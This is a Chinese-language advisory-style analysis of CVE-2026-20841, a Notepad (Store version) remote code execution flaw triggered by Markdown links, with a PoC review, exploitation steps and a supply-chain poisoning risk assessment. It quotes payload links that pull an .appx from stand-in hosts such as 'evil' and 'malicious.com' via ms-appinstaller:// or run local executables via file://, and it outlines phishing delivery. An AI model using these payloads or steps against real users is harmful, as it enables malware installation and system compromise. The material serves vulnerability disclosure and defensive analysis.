## CVE-2026-20841 - Windows 记事本 (Microsoft Store 版本) 远程代码执行 (RCE), 命令注入

**漏洞编号:** CVE-2026-20841

**漏洞类型:** 远程代码执行 (RCE), 命令注入

**影响应用:** Windows 记事本 (Microsoft Store 版本)

**危害等级:** 高危

**CVSS评分:** 8.8

**影响版本:** Microsoft Store 分发的现代版记事本 (NotepadApp)

**利用条件:** 用户打开特制恶意Markdown文件即可触发，无需认证，需要用户交互（点击打开恶意文件）

**POC 可用性:** 8

**POC 类型:** 概念验证 (PoC)

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

### POC有效性分析

Windows记事本，特别是通过Microsoft Store分发的现代版本，被发现存在一个高危远程代码执行漏洞，编号为CVE-2026-20841。该漏洞在通用漏洞评分系统（CVSS）中获得了8.8分的高危评分，并已被微软确认为正被攻击者在野利用。其核心成因在于记事本在处理特定URI协议（如`ms-appinstaller://`和`file://`）或Markdown文件时，未能充分进行安全验证和字符清理，导致恶意构造的URI能够被解析并执行，从而实现命令注入或任意文件执行。

所提供的`PoC.md`文件是一个高度简洁且直接的Markdown格式的概念验证代码，它通过嵌入两种类型的恶意链接来展示此漏洞的利用方式：

1.  `[poc](ms-appinstaller://?source=https://evil/xxx.appx)`：此链接利用`ms-appinstaller://`协议。在受影响的记事本版本中，当用户打开包含此链接的Markdown文件时，记事本会尝试启动Windows应用安装器，并从指定的远程URL（`https://evil/xxx.appx`）下载并提示安装应用程序。攻击者可以利用此机制诱导用户安装恶意应用程序，从而实现系统入侵。
2.  `[poc](file://C:/windows/system32/cmd.exe)`：此链接利用`file://`协议直接指向本地可执行文件。在漏洞存在的情况下，当记事本解析到这样的链接时，它可能会在没有弹出任何安全警告的情况下，直接执行`C:/windows/system32/cmd.exe`。这直接展示了远程代码执行的能力，攻击者只需替换`cmd.exe`为任意恶意程序路径即可完全控制受害系统。

综合分析，该PoC代码通过利用记事本对特定URI协议的信任和不当处理，清晰且直接地展示了CVE-2026-20841漏洞的核心机制。它不依赖复杂的环境配置或额外的工具，仅通过一个恶意构造的Markdown文件即可触发。因此，该PoC具有高度的有效性，能够成功验证该漏洞所描述的命令注入和远程代码执行能力，与搜索结果中“点击即沦陷”和“利用门槛极低”的描述完全吻合。

### 利用步骤

1.  **构造恶意Markdown文件**：攻击者首先创建一个恶意Markdown文件（例如`payload.md`），在其中嵌入特制的URI链接。这些链接可以指向远程恶意应用程序的安装包（如`ms-appinstaller://?source=https://malicious.com/malware.appx`）或本地系统的可执行文件（如`file://C:/Windows/System32/calc.exe`用于测试，或`file://C:/ProgramData/malware.exe`用于实际攻击）。
2.  **社会工程学攻击**：攻击者通过鱼叉式钓鱼邮件、恶意网站诱导下载、即时通讯软件发送等多种社会工程学手段，诱骗目标用户下载并打开这个恶意Markdown文件。由于记事本是Windows系统中一个默认且被广泛信任的内置应用程序，用户对其打开的文件通常警惕性较低。
3.  **用户交互触发**：受害者在Windows操作系统中双击打开了攻击者提供的`payload.md`文件。记事本程序随之启动并开始解析该文件内容。
4.  **漏洞触发与代码执行**：当记事本解析到`payload.md`中包含的特制恶意URI链接时，由于其内部处理机制的缺陷，它会尝试执行这些URI：
    *   如果URI是`ms-appinstaller://`协议，系统将自动启动Windows应用安装器，并根据链接指示从指定URL（攻击者控制的服务器）下载并提示安装恶意应用程序。
    *   如果URI是`file://`协议，记事本可能会在没有进一步用户确认的情况下，直接执行链接指向的本地可执行文件，从而实现攻击者预期的任意代码执行。
5.  **攻击完成**：一旦恶意命令或应用程序成功执行或安装，攻击者即可在受害者的系统上获得初始立足点，进而实施数据窃取、部署勒索软件、建立持久化后门、进行横向移动等恶意行为，对受害者的系统和数据造成严重危害。

### 投毒风险分析

**提供的PoC代码本身的投毒风险（低）：**

本分析中涉及的`PoC.md`文件是一个纯文本的Markdown文档，其内容直接展示了利用CVE-2026-20841漏洞的关键URI结构。它不包含任何可执行代码、混淆逻辑、恶意脚本或加密内容。PoC的目的是透明地演示漏洞机制，而非直接携带恶意载荷。因此，从提供的`PoC.md`文件本身来看，其被用于投毒的直接风险极低。用户可以轻松阅读和理解其内容，并确认其仅为概念验证。

**PoC项目（`CVE-2026-20841-PoC`）的投毒风险（低到中等）：**

虽然`PoC.md`本身安全，但`README.md`提到了一个PoC工具，并提供了GitHub发布页面的链接。任何从第三方（包括GitHub Releases页面）下载和运行的可执行文件都存在潜在风险。尽管该项目的`README.md`明确指出其为“概念验证工具”，旨在“教育和提高意识”，并表示“不需要编程技能或技术知识”，但这并不能完全消除下载的可执行文件可能被篡改或植入恶意代码的可能性。攻击者可以克隆合法的PoC项目，在其中注入恶意功能后重新打包发布，或通过其他手段在看似合法的PoC工具中植入后门。因此，用户在下载和运行任何此类可执行PoC工具时，务必保持高度警惕，验证其来源（例如通过哈希值比对），并在隔离的、受控的测试环境中执行。

**利用此漏洞进行投毒的普遍风险（高）：**

尽管PoC代码和其项目的直接投毒风险相对较低，但CVE-2026-20841漏洞本身的性质决定了它被攻击者利用进行大规模投毒和恶意软件分发的风险极高。由于Windows记事本是系统内置且用户信任度极高的应用程序，且该漏洞的利用门槛极低（仅需用户打开一个特制文件），攻击者可以非常容易地通过社会工程学手段分发恶意Markdown文件。这些文件可以被精心构造，以安装各种恶意软件，包括但不限于远程访问木马（RAT）、勒索软件、信息窃取器、键盘记录器或加密货币挖矿程序。攻击者可以伪装成合法的文档、更新通知或常用工具的安装包，利用用户对记事本的信任和对`ms-appinstaller://`等协议的不熟悉进行诱骗，从而绕过传统的安全防护措施。鉴于该漏洞已被证实遭到在野利用，组织和个人必须高度重视此漏洞的修复和防护，及时更新系统和应用程序，以减轻潜在的投毒风险和攻击面。

**项目地址:** https://github.com/404godd/CVE-2026-20841-PoC

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-20841
